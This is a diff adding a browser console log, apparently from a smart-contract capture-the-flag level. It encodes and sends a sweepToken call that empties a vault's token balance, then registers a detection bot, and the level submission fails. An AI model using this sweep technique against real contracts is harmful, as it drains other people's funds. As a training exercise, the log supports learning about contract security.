@@ -1,0 +1,79 @@
+const cryptoVaultAddress = await contract.cryptoVault()
+undefined
+await web3.eth.getStorageAt(cryptoVaultAddress, 1)
+'0x00000000000000000000000068fc2f374f4b26aefbf1d176c83506d130866f3a'
+const legacyTokenAddress = await contract.delegatedFrom()
+undefined
+await web3.eth.call({
+  from: player,
+  to: legacyTokenAddress,
+  data: '0xc89e4361'
+})
+'0x00000000000000000000000068fc2f374f4b26aefbf1d176c83506d130866f3a'
+const cryptoVaultAddress = await contract.cryptoVault();
+undefined
+const legacyTokenAddress = await contract.delegatedFrom();
+undefined
+await contract.balanceOf(cryptoVaultAddress).then(b => b.toString());
+'100000000000000000000'
+const _function = {
+  "inputs": [
+    { 
+      "name": "token",
+      "type": "address"
+    }
+  ],
+  "name": "sweepToken", 
+  "type": "function"
+};
+const _parameters = [
+  legacyTokenAddress
+];
+undefined
+const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
+undefined
+await web3.eth.sendTransaction({
+  from: player,
+  to: cryptoVaultAddress,
+  data: _calldata
+});
+{blockHash: '0xa8697e2a624520529c948daf5b76df49ba3ed6a98e8f51fdedbdd51dc665080a', blockNumber: 8138675, contractAddress: null, cumulativeGasUsed: 481089, effectiveGasPrice: 2548155216, …}
+await contract.balanceOf(cryptoVaultAddress).then(b => b.toString());
+'0'
+3.b8177702.chunk.js:2 [Violation] 'setInterval' handler took 94ms
+await contract.cryptoVault()
+'0x3379F6a7D6D7bFB259b07fa84EAEC10238b52B78'
+3.b8177702.chunk.js:2 [Violation] 'setInterval' handler took 97ms
+const fortaAddress = await contract.forta()
+undefined
+const detectionBotAddress = "0x1e39b36d0A5847Ab46431a55E13ce05239e83A57"
+undefined
+const _function = {
+  "inputs": [
+    { 
+      "name": "detectionBotAddress",
+      "type": "address"
+    }
+  ],
+  "name": "setDetectionBot", 
+  "type": "function"
+};
+const _parameters = [
+  detectionBotAddress
+];
+undefined
+const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
+undefined
+await web3.eth.sendTransaction({
+  from: player,
+  to: fortaAddress,
+  data: _calldata
+})
+{blockHash: '0xe3a619157f5a5dc0a4cfc1276432400c25fb643e41da753399f784c17062dbaf', blockNumber: 8138715, contractAddress: null, cumulativeGasUsed: 566538, effectiveGasPrice: 2523549870, …}
+const bot = await fortaContract.methods.usersDetectionBots(player).call();
+VM156:1 Uncaught ReferenceError: fortaContract is not defined
+    at <anonymous>:1:13
+(anonymous) @ VM156:1Understand this error
+3.b8177702.chunk.js:2 [Violation] 'setInterval' handler took 82ms
+^^.js:45 ╚(▲_▲)╝ Submitting level instance... <  < <<PLEASE WAIT>> >  >
+^^.js:93 (╯°□°）╯ Oops! Looks like you haven't cracked this level just yet (╯°□°）╯
